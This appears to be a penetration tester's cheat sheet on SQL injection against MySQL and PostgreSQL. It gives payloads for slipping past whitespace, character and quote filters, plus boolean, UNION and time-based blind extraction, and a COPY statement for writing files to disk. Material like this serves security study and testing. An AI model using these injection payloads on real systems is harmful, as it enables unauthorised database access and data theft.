# Bypass filters

## Whitespace

In mysql, we can also avoid using spaces directly to bypass any filters using inline comments `/**/`, e.g. `SELECT/**/1`

In postgresql, we can do the same using `+` characters, e.g. `SELECT+1`

We can sometimes achieve the same using urlencoded characters for spaces, i.e. `%20`, or double-encoded characters, i.e. `%2520`.

## Forbidden characters

We can bypass by encoding/decoding from ASCII as well and concatening them together. _This works for string values in basic DML statements, but not for certain DDL statements._ E.g. 

```sql
select ascii('w'),ascii('0'),ascii('0'),ascii('t');
select chr(119) || chr(48) || chr(48) || chr(116);
```

## Forbidden quotes

Postgres allows quotes to be replaces with a start and end tag instead using a dollar sign `$$` or `$TAG$` syntax.

```sql postgres
SELECT 'w00t';
SELECT $$w00t$$;
SELECT $TAG$w00t$TAG$;
```

# Exfiltration

Create a simple boolean check first to prove that we have a blind injection and how it affects our HTTP responses.

```sql mysql
AAAA') or (SELECT 1)=1%#
AAAA') or (SELECT 1)=0%#
```

We can use a UNION query to extract data directly out of the database, but this requires us to match the data types and columns.

```sql pgsql
select distinct(RESOURCEID)
from AM_USERRESOURCESTABLE
where USERID=1
UNION
select 1
```

Alternatively, we can use a UNION query to infer data using a blind injection.

```sql pgsql
select distinct(RESOURCEID)
from AM_USERRESOURCESTABLE
where USERID=1
UNION
select case when (select 1)=1 then 1 else 0 end
```

Another option is to use a time-based injection using `SLEEP 1` (mysql) or `pg_sleep(1)` (postgresql) to detect whether a code branch is evaluated or not by checking the execution time of requests.

# Write to disk

```sql postgresql
COPY temptable TO 'C:\\file';
```

## Other

Use temporary tables in postgress:

```sql
CREATE TEMP TABLE temptable (mycol TEXT);
INSERT INTO temptable(mycol) VALUES ('w00t');
SELECT * FROM temptable;
```